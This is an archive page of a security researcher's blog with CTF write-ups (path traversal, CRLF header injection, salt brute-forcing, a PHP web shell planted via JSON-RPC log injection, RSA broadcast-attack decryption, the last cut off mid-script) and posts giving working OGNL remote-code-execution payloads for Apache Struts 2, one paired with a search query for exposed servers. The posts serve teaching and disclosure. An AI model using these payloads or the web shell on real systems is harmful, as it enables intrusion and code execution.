

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>&lt;/pwntester&gt; - Page 5</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/page/5/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="prev" href="http://www.pwntester.com/page/4/">
    <link rel="next" href="http://www.pwntester.com/page/6/">
    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="paged archive-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        


<article class="post tag-ctf tag-web tag-olympicctf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-02-09">09 Feb 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/web/">Web</a>, <a href="../../tag/olympicctf/">OlympicCTF</a></span>
        <h1 class="post-title"><a href="../../blog/2014/02/09/olympic-ctf-curling-tasks/">Olympic CTF CURLing tasks</a></h1>
    </header>
    <section class="post-content">
        <p>I had the honour to participate with <strong>int3pids</strong> in the #Olympic CTF and these are the write ups of the Web tasks we solved.</p>

<h2 id="curling200xnginx">CURLing 200: Xnginx</h2>

<p>In this level we were presented with a simple web site where we could check some news</p>

<p><img src="../../content/images/octopress/olympic-web200-1.png" alt=""></p>

<p>First thing to notice is that the news URL is vulnerable to path transversal:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=31-12-2013  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../../../etc/passwd  
</code></pre>

<p>Since the name of the task was <strong>xnginx</strong> I looked for the nginx configuration file:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../etc/nginx/nginx.conf  
</code></pre>

<p>That returned the configuration file:</p>

<p><img src="../../content/images/octopress/olympic-web200-2.png" alt=""></p>

<p>Looking at the configuration file we can see where the site configuration is stored so we issued another request to fetch the site config:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/news/?f=../../../etc/nginx/sites-enabled/default  
</code></pre>

<p>Config file:</p>

<pre><code class="language-lang-bash line-numbers data-line=35-38 "># You may add here your
# server {
#   ...
# }
# statements for each of your virtual hosts to this file

##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# http://wiki.nginx.org/Pitfalls
# http://wiki.nginx.org/QuickStart
# http://wiki.nginx.org/Configuration
#
# Generally, you will want to move this file somewhere, and start with a clean
# file but keep this around for reference. Or just disable in sites-enabled.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

server {  
    #listen   80; ## listen for ipv4; this line is default and implied
    #listen   [::]:80 default ipv6only=on; ## listen for ipv6

    root /usr/share/nginx/www;
    index index.html index.htm;

    # Make site accessible from http://localhost/
    server_name localhost;

        location / {
        limit_req zone=one burst=5 nodelay;
            proxy_pass http://127.0.0.1:5001;
        }

        location = /secret/flag {
            root /home;
            internal;
        }
}


# another virtual host using mix of IP-, name-, and port-based configuration
#
#server {
#   listen 8000;
#   listen somename:8080;
#   server_name somename alias another.alias;
#   root html;
#   index index.html index.htm;
#
#   location / {
#       try_files $uri $uri/ /index.html;
#   }
#}


# HTTPS server
#
#server {
#   listen 443;
#   server_name localhost;
#
#   root html;
#   index index.html index.htm;
#
#   ssl on;
#   ssl_certificate cert.pem;
#   ssl_certificate_key cert.key;
#
#   ssl_session_timeout 5m;
#
#   ssl_protocols SSLv3 TLSv1;
#   ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv3:+EXP;
#   ssl_prefer_server_ciphers on;
#
#   location / {
#       try_files $uri $uri/ /index.html;
#   }
#}
</code></pre>

<p>The interesting bits are highlighed:</p>

<pre><code class="language-lang-bash line-numbers ">location = /secret/flag {  
    root /home;
    internal;
}
</code></pre>

<p>Look like the flag is located at <a href="http://109.233.61.11:27280/secret/flag">http://109.233.61.11:27280/secret/flag</a> but only internal requests will get through. This looks like a SSRF task but in the end it was something completly different.</p>

<p>At the same time we found that the return link was vulnerable to Header Manipulation:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?retpath=/news  
</code></pre>

<p>The above URL generates a redirect to <strong>news</strong></p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 307 TEMPORARY REDIRECT  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:07:47 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 0  
Connection: keep-alive  
Location: /news  
</code></pre>

<p>And</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?repath=/secret/flag%0d%0aHost:%20127.0.0.1  
</code></pre>

<p>generated:</p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 307 TEMPORARY REDIRECT  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:10:22 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 0  
Connection: keep-alive  
Location: /secret/flag  
Host: 127.0.0.1  
</code></pre>

<p>However that was not enough to trick nginx.</p>

<p>After researchig about Nginx we found out that it has a similar feature as <a href="https://tn123.org/mod_xsendfile/">Apache mod_xsendfile</a> called <a href="http://wiki.nginx.org/X-accel">X-Accel module</a> that provides internal redirects. So basically nginx will intercept the responses and if it contains the X-Accel-redirect header, it will request the resource specified in the header and return the response back to the user. With that we were able to use the header manipulation vulnerability to craft the following request:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:27280/?retpath=/%0D%0AX-Accel-Redirect%3A%20/secret/flag  
</code></pre>

<p>response was :</p>

<pre><code class="language-lang-bash line-numbers ">HTTP/1.1 200 OK  
Server: nginx/1.1.19  
Date: Sun, 09 Feb 2014 17:15:32 GMT  
Content-Type: text/html; charset=utf-8  
Last-Modified: Thu, 06 Feb 2014 13:55:07 GMT  
Connection: keep-alive  
Content-Length: 38

CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}  
</code></pre>

<h2 id="curling300emdee">CURLing 300: emdee</h2>

<p>This level got us crazy for a long time, in the end it was an easy task to solve. We were presented with a revolutionary md5 hashing system :)</p>

<p><img src="../../content/images/octopress/olympic-web300-1.png" alt=""></p>

<p>Submitting a new secret got us the hash and the timestamp used for the hashing:</p>

<p><img src="../../content/images/octopress/olympic-web300-2.png" alt=""></p>

<p>After playing with other approaches, including sending long secrets so that the timestamp was cut off, we found out that we could hash non printable characters and some of them were really interesting, specially the "del" one or <strong>\x7F</strong></p>

<p>We can send del commands to delete previous introduced characters so hash(aa\xF7) == hash(a) for the same timestamp. We can used that to remove all the Salt characters except for the first one and then use the returned timestamp and hash to brute force the first character in the salt. And then repeat to extract the full salt.</p>

<p>To find out the length of the salt we can use the following script:</p>

<pre><code class="language-lang-python line-numbers ">for j in xrange(1,64):  
    secret = '\x7F' * j
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if hashlib.md5(ts).hexdigest() == h:
        SALTLEN = j
        break
</code></pre>

<p>We basically send n delete characters and check if the returned hash is the result of hashing the returned timestamp. This gives us a lenght of 40 chracters. Now we can brute force the salt with the following script:</p>

<pre><code class="language-lang-python line-numbers ">import requests  
import re  
import hashlib

def parse(content):  
    m = re.search(r'your_secret \+ ([0-9.]+).*&lt;em&gt;([0-9a-f]+)', content)
    if not m:
        raise
    return m.group(1), m.group(2)

def bruteforce(prefix, h, ts):  
    for c in map(chr, range(32,126)):
        if hashlib.md5(prefix+c+ts).hexdigest() == h:
            return c
    return None
URL = 'http://109.233.61.11:34380/'  
SALTLEN = 0  
salt = ''

for j in xrange(1,64):  
    secret = '\x7F' * j
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if hashlib.md5(ts).hexdigest() == h:
        SALTLEN = j
        break

for i in range(SALTLEN):  
    secret = '\x7F' * (39-i)
    if i == 39:
        secret = 'a'
    res = requests.post(URL, data={'secret':secret})
    ts, h = parse(res.content)
    if i == 39:
        ts = secret+ts
    c = bruteforce(salt, h, ts)
    salt += c
print salt  
</code></pre>

<p>Running the script returns us the salf: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJ</p>

<p>Now we are said that the secret was a "short dictionary word" so we can run a dictionary attack to find the word that produces the hash so that md5(salt+word) = 40288d60073775070a7edcdcd1df9c56 which turns out to be "<strong>cow</strong>"</p>

<p>Flag was salt+word: klgWCV7YgP0ugoiIXE9u0kSXpcnv3Z6eKmkIohJJcow</p>

<h2 id="curling400rpc">CURLing 400: RPC</h2>

<p>In this level we were presented with a "broken" link" saying:</p>

<pre><code class="language-lang-bash line-numbers ">Notice: Undefined index: rpc_json_call in /var/www/index.php on line 27  
</code></pre>

<p>So we crafted a POST request with the following JSON RPC parameter:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call={ "jsonrpc": "2.0","method": "function", "params": ["123"] }  
</code></pre>

<p>And we got a "<strong>invalid method. Try test.</strong>" as result.</p>

<p>Nice, so we tried "test" as indicated and got a "<strong>42</strong>" as a result. We tried a bunch of methods with no luck until we tried with PHP magic method names and we got different responses for "<strong>construct" and "</strong>wakeup" all the remaining ones were returning the invalid method response.</p>

<p>"__wakeup" was not taking arguments and just returned a 200 OK</p>

<p>"__construct" was complaining about wrong arguments:</p>

<pre><code class="language-lang-bash line-numbers ">invalid method params! Valid is:  
    log_dir
    debug
    state
</code></pre>

<p>Ok, so we sent a request like</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call={ "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.log", "debug":true, "state":"test"} }  
</code></pre>

<p>We were expecting that we could write in <strong>/var/www/kk.log</strong> but nothing appeared there.</p>

<p>Fortunately we realized that we could send several commands so we tried:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.log", "debug":true, "state":"test"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And voila, we got a beautiful "<strong>...loged</strong>" response so we checked the "kk.log" file and it was there:</p>

<pre><code class="language-lang-bash line-numbers ">1391967947  O:3:"rpc":1:{s:5:"state";s:4:"test";}  
</code></pre>

<p>It seems like a serialized string but more interetingly, our test string was there, so next step is try to inject a web shell:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.php", "debug":true, "state":"&lt;? echo file_get_contents('index.php');?&gt;"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And there we go a beautiful shell. All we have to do is:</p>

<pre><code class="language-lang-bash line-numbers ">rpc_json_call=[  
 { "jsonrpc": "2.0","method": "__construct", "params": {"log_dir":"/var/www/kk.php", "debug":true, "state":"&lt;? passthru($_GET['cmd']);?&gt;"} },
 { "jsonrpc": "2.0","method": "__wakeup", "params": {} }
]
</code></pre>

<p>And then:</p>

<pre><code class="language-lang-bash line-numbers ">http://109.233.61.11:8880/kk.php?cmd=cat%20/FLAG  
</code></pre>

<p>And flag:</p>

<pre><code class="language-lang-bash line-numbers ">1391968178 O:3:"rpc":1:{s:5:"state";s:28:"CTF{b15ffee30a117f418d1cede6faa57778} ";}  
</code></pre>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/02/09/olympic-ctf-curling-tasks/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-java tag-ognl tag-struts2">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-21">21 Jan 2014</time> on <a href="../../tag/java/">Java</a>, <a href="../../tag/ognl/">OGNL</a>, <a href="../../tag/struts2/">Struts2</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/">Struts 2 devmode: An OGNL backdoor</a></h1>
    </header>
    <section class="post-content">
        <p>There are many Struts 2 developers familiar with the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">development mode</a> on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. <br>
What it is not so well known (actually it doesn’t even appear in the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">devmode site</a>) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter. This handy feature for developers turns into a security nightmare if application is released into production servers with this flag on.</p>

<p>If we look at the <a href="http://struts.apache.org/release/2.3.x/docs/debugging.html">“debugging” page</a>, we can find some info on how it works. It enables the <a href="http://struts.apache.org/release/2.3.x/docs/debugginginterceptor.html">debugging interceptor</a> which brings us some interesting commands:</p>

<ul>
<li><strong>xml</strong>: Dumps the parameters, context, session, and value stack as an XML document.</li>
<li><strong>console</strong>: Shows a popup 'OGNL Console' that allows the user to test OGNL expressions against the value stack. The XML data from the 'xml' mode is inserted at the top of the page.</li>
</ul>

<p><img src="../../content/images/octopress/devmode-1.png" alt=""></p>

<ul>
<li><strong>command</strong>: Tests an OGNL expression and returns the string result. Only used by the OGNL console.</li>
<li><strong>browser</strong>: Shows field values of an object specified in the object parameter (#context by default). When the object parameters is set, the '#' character needs to be escaped to '%23'. Like debug=browser&amp;object=%23parameters</li>
</ul>

<p><img src="../../content/images/octopress/devmode-2.png" alt=""></p>

<p>So we can abuse this feature to run our arbitrary commands by loading the following page:</p>

<pre><code class="language-lang-bash line-numbers ">http://vulnserver.com/some.action?debug=command&amp;expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,@java.lang.Runtime@getRuntime%28%29.exec%28%27/Applications/Calculator.app/Contents/MacOS/Calculator%27%29  
</code></pre>

<p>Note that this will work even with the latest Struts 2 version (where “allowStaticMethodAccess” is immutable) using the payload explained in this <a href="http://www.pwntester.com/blog/2014/01/20/time-to-update-your-ognl-payloads/">previous post</a></p>

<p>Now, you may be wondering who releases its applications in devmode? Go, check it yourself:</p>

<pre><code class="language-lang-bash line-numbers ">https://www.google.com/search?q=intitle%3A%22Struts+Problem+Report%22+%22You+are+seeing+this+page+because+development+mode+is+enabled.%22  
</code></pre>

<p>So, don’t forget to disable devmode before releasing your applications to production.</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-java tag-ognl">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-20">20 Jan 2014</time> on <a href="../../tag/java/">Java</a>, <a href="../../tag/ognl/">OGNL</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/20/time-to-update-your-ognl-payloads/">Time to update your OGNL payloads</a></h1>
    </header>
    <section class="post-content">
        <p>OGNL is an expression language for getting and setting properties of Java objects, plus other extras such as list projection, selection, lambda expressions and method invocation. So if attackers can provide the OGNL engine with arbitrary OGNL expressions, they will be able to execute arbitrary code on the application server and/or access and modify any value stored in the Struts 2 value stack.</p>

<p>Struts 2 provided an addition layer of protection by disabling static method invocation so that methods like <strong>java.lang.Runtime.exec</strong> could not be executed. This protection was bypassed in the first place by <a href="https://twitter.com/meder">Meder Kydyraliev</a> who came up with the following OGNL expression where he was able to modify the required objects in order to disable the protection before actually calling the static methods:</p>

<pre><code class="language-lang-java line-numbers data-line=1 ">#_memberAccess['allowStaticMethodAccess'] = true
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Its important to note that even if static methods were not allowed, an attacker will normally be able to modify objects stored in the Value Stack like “Session” and cause severe damage to the running application and back end.</p>

<p>Due to the severity of the vulnerabilities and the number of them being reported at that time, Struts 2 decided to make the <strong>#_memberAccess</strong> “<strong>allowStaticMethodAccess</strong>” member immutable in version 2.3.14.2, effectively disabling Meder’s payload.</p>

<p>This control is still easily bypassable using basic Java reflection to set the “<strong>allowStaticMethodAccess</strong>” as an accessible field:</p>

<pre><code class="language-lang-java line-numbers data-line=1-3 ">#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')
#f.setAccessible(true)
#f.set(#_memberAccess, true)
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Note that even if the application is using the latest Struts 2 version, a developer can still pass user controlled data to Struts 2 methods evaluating their arguments as OGNL Expressions as the <a href="http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html"><strong>Apache Roller</strong> vulnerability</a> found by <a href="https://twitter.com/jonpasski">Jon Passki</a></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/01/20/time-to-update-your-ognl-payloads/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-hackyou201458 tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-17">17 Jan 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/hackyou201458/">HackYou2014</a>, <a href="../../tag/crypto/">Crypto</a></span>
        <h1 class="post-title"><a href="../../blog/2014/01/17/hackyou2014-crypto400-write-up/">#hackyou2014 Crypto400 write-up</a></h1>
    </header>
    <section class="post-content">
        <p>In this <a href="http://hackyou.ctf.su/tasks/crypto400">level</a> we are said that:</p>

<blockquote>
  <p>We have intercepted communication in a private network. It is used a strange protocol based on RSA cryptosystem.</p>
  
  <p>Can you still prove that it is not secure enough and get the flag?</p>
</blockquote>

<p>We are given a pcap file with a bunch of transmissions generated with this script:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
import sys  
import struct  
import zlib  
import socket

class Client:  
    def __init__(self, ip):
        #init
        self.ip = ip
        self.port = 0x1337
        #connect
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((self.ip, self.port))
        #recieve e
        self.e = self.Recv()
        #recieve n
        self.n = self.Recv()
        self.e, self.n = int(self.e), int(self.n)

    def Recv(self):
        #unpack data
        length = struct.unpack('!H', self.conn.recv(2))
        data = zlib.decompress(self.conn.recv(length[0]))
        return data

    def Pack(self, data):
        #compress data
        data = zlib.compress('%s' % data)
        length = struct.pack('!H', len(data))
        return '%s%s' % (length, data)

    def Send(self, msg):
        #send message
        msg = int(msg.encode('hex'),16)
        assert(msg &lt; self.n)
        msg = pow(msg, self.e, self.n)
        self.conn.send(self.Pack(msg))
        print '[+] Message send'

    def __del__(self):
        #close connection
        self.conn.close()

if len(sys.argv) != 2:  
    print 'Usage: %s &lt;ip&gt;' % sys.argv[0]
    sys.exit(0)

flag = open('message.txt').readline()  
test = Client(sys.argv[1])  
test.Send(flag)  
</code></pre>

<p>Analyzing the protocol it looks like it goes something like:</p>

<ul>
<li>Message to be send is read from external file</li>
<li>Connection is established against given IP on port 4919 (0x1337)</li>
<li>Server sends "e" packet [data lengt + zlib(data)]</li>
<li>Server sends "n" packet [data lengt + zlib(data)]</li>
<li>Both "e" and "n" are casted to integers</li>
<li>Client encodes message as integer</li>
<li>Client verifies message &lt; n</li>
<li>Client encrpyts message using: enc = pow(message, e, n)</li>
<li>Client sends encrypted message packet [data lengt + zlib(data)]</li>
</ul>

<p>If we explore the pcap with wireshark we can see a bunch of transmissions from Client to Server. We will need to process it in order to extract the message, the following python+scapy script will read all the interesting elements being transmited for each communication: e, n and flag:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
from scapy.all import *  
from struct import *  
import zlib

pkts = PcapReader("packets.pcap")  
for p in pkts:  
    pkt = p.payload
    if pkt.getlayer(Raw):
        raw = pkt.getlayer(Raw).load
        print "{0}:{1} -&gt; {2}:{3}".format(pkt.src,pkt.sport,pkt.dst,pkt.dport)
        if str(pkt.sport) == "4919":
            elength = struct.unpack("!H",raw[0:2])[0]
            ezip = raw[2:2 + elength]
            e = int(zlib.decompress(ezip))
            nlength = struct.unpack("!H",raw[elength + 2 :elength + 4])[0]
            nzip =  raw[elength + 4:elength + 4 + nlength]
            n = int(zlib.decompress(nzip))
            print "e = {0}".format(e)
            print "n = {0}".format(n)
        if str(pkt.dport) == "4919":
            flaglength = struct.unpack("!H",raw[0:2])[0]
            flagzip = raw[2:2 + flaglength]
            encflag = int(zlib.decompress(flagzip))
            print "encflag = {0}".format(encflag)
</code></pre>

<p>As an example of one communication:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto400&gt; python decrypter.py  
WARNING: No route found for IPv6 destination :: (no default route?)  
192.168.1.10:4919 -&gt; 192.168.1.5:41260  
e = 17  
n = 27658060678038715780470429570597987144542213875178081185638364125349217264266787337266356239252353691015124430930507236433817624156361120645134956689683794554169169254645287613480048966030722812191823753459580311585866523664171185580520752591976764843551787247552790540802105791272457516072210641470817920157370947681970410336005860197552073763981521526496955541778866864446616347452950889748333309771690509856724643918258831575902389005661750464296924818808365029037591660424882588976607197196824985084365272217072807601787578262208488572448451271800547820717066767396857464594301327160705353075064322975430897551911  
192.168.1.5:41260 -&gt; 192.168.1.10:4919  
encflag = 11433488612991990768536086698965180146550356348457563234735402111134701115830423042016221831657484325065472609147436229496479358788735270448637824809543880271526735635196884978639585020518147152207002685868984199742884443523231593245377292570809368330956970290791633106067116466080014631110596564728982066569618319541351401820732547227122970369299780366876340403436785218211729531092484723580223801525992510782266856454394478372421830988205823368541860973674259795969870252832216828042174346473447490557323038031625277043161510854825069681462499200978561823301487118145650943076528233694749306585201212677836363102350  
</code></pre>

<p>Analyzing the traffic, there are 19 communications with different modulos but always same exponent (e=17) which simplifies the problem</p>

<pre><code class="language-lang-bash line-numbers ">encrypted = (flag^17) % modulo  
</code></pre>

<p>We should only care to find F so that:</p>

<pre><code class="language-lang-bash line-numbers ">encflag1 = F % n1  
encflag2 = F % n2  
...
...
encflag18 = F % n18  
encflag19 = F % n19  
</code></pre>

<p>In order to solve the equation we can use the <a href="http://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese Remainder Theorem (CRT)</a>. For which I found a <a href="https://mail.python.org/pipermail/edu-sig/2001-August/001665.html">Python implementation</a> that I needed to adjust a little bit:</p>

<pre><code class="language-lang-python line-numbers ">from operator import mod

def eea(a,b):  
    """Extended Euclidean Algorithm for GCD"""
    v1 = [a,1,0]
    v2 = [b,0,1]
    while v2[0]&lt;&gt;0:
       p = v1[0]//v2[0] # floor division
       v2, v1 = map(lambda x, y: x-y,v1,[p*vi for vi in v2]), v2
    return v1

def inverse(m,k):  
     """
     Return b such that b*m mod k = 1, or 0 if no solution
     """
     v = eea(m,k)
     return (v[0]==1)*(v[1] % k)

def crt(ml,al):  
     """
     Chinese Remainder Theorem:
     ms = list of pairwise relatively prime integers
     as = remainders when x is divided by ms
     (ai is 'each in as', mi 'each in ms')

     The solution for x modulo M (M = product of ms) will be:
     x = a1*M1*y1 + a2*M2*y2 + ... + ar*Mr*yr (mod M),
     where Mi = M/mi and yi = (Mi)^-1 (mod mi) for 1 &lt;= i &lt;= r.
     """

     M  = reduce(lambda x, y: x*y,ml)        # multiply ml together
     Ms = [M/mi for mi in ml]   # list of all M/mi
     ys = [inverse(Mi, mi) for Mi,mi in zip(Ms,ml)] # uses inverse,eea
     return reduce(lambda x, y: x+y,[ai*Mi*yi for ai,Mi,yi in zip(al,Ms,ys)]) % M

F = crt(modulos,remainders)  
</code></pre>

<p>Once we find F, we can calculate its 17th root in order to find the integer version of the flag:</p>

<pre><code class="language-lang-python line-numbers ">def root(x,n):  
    """Finds the integer component of the n'th root of x,
    an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
    """
    high = 1
    while high ** n &lt; x:
        high *= 2
    low = high/2
    while low &lt; high:
        mid = (low + high) // 2
        if low &lt; mid and mid**n &lt; x:
            low = mid
        elif high &gt; mid and mid**n &gt; x:
            high = mid
        else:
            return mid
    return mid + 1

intflag = root(F,17)  
</code></pre>

<p>And from there its easy to get the flag:</p>

<pre><code class="language-lang-python line-numbers ">flag = hex(intflag)[2:-1].decode('hex')  
</code></pre>

<p>Running our script returns:</p>

<pre><code class="language-lang-bash line-numbers ">alvaro@winterfell ~/D/h/crypto400&gt; python decrypter.py  
WARNING: No route found for IPv6 destination :: (no default route?)  
Secret message! CTF{336b2196a2932c399c0340bc41cd362d}  
</code></pre>

<p>Cool!!!!</p>

<p>This is the full script:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python
from scapy.all import *  
from struct import *  
import zlib  
from operator import mod

def eea(a,b):  
    """Extended Euclidean Algorithm for GCD"""
    v1 = [a,1,0]
    v2 = [b,0,1]
    while v2[0]&lt;&gt;0:
       p = v1[0]//v2[0] # floor division
       v2, v1 = map(lambda x, y: x-y,v1,[p*vi for vi in v2]), v2
    return v1

def inverse(m,k):  
     """
     Return b such that b*m mod k = 1, or 0 if no solution
     """
     v = eea(m,k)
     return (v[0]==1)*(v[1] % k)

def crt(ml,al):  
     """
     Chinese Remainder Theorem:
     ms = list of pairwise relatively prime integers
     as = remainders when x is divided by ms
     (ai is 'each in as', mi 'each in ms')

     The solution for x modulo M (M = product of ms) will be:
     x = a1*M1*y1 + a2*M2*y2 + ... + ar*Mr*yr (mod M),
     where Mi = M/mi and yi = (Mi)^-1 (mod mi) for 1 &lt;= i &lt;= r.
     """

     M  = reduce(lambda x, y: x*y,ml)        # multiply ml together
     Ms = [M/mi for mi in ml]   # list of all M/mi
     ys = [inverse(Mi, mi) for Mi,mi in zip(Ms,ml)] # uses inverse,eea
     return reduce(lambda x, y: x+y,[ai*Mi*yi for ai,Mi,yi in zip(al,Ms,ys)]) % M

def root(x,n):  
    """Finds the integer component of the n'th root of x,
    an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
    """
    high = 1
    while high ** n &lt; x:
        high *= 2
    low = high/2
    while low &lt; high:
        mid = (low + high) // 2
        if low &lt; mid and mid**n &lt; x:
            low = mid
        elif high &gt; mid and mid**n &gt; x:
            high = mid
        else:
            return mid
    return mid + 1

pkts = PcapReader("packets.pcap")  
modulos = []  
remainders = []  
exponents = []  
for p in pkts:  
    pkt = p.payload
    if pkt.getlayer(Raw):
        raw = pkt.getlayer(Raw).load
        if str(pkt.sport) == "4919":
            elength = struct.unpack("!H",raw[0:2])[0]
            ezip = raw[2:2 + elength]
            e = int(zlib.decompress(ezip))
            nlength = struct.unpack("!H",raw[elength + 2 :elength + 4])[0]
            nzip =  raw[elength + 4:elength + 4 + nlength]
            n = int(zlib.decompress(nzip))
            modulos.append(n)
            exponents.append(e)
        if str(pkt.dport) == "4919":
            flaglength = struct.unpack("!H",raw[0:2])[0]
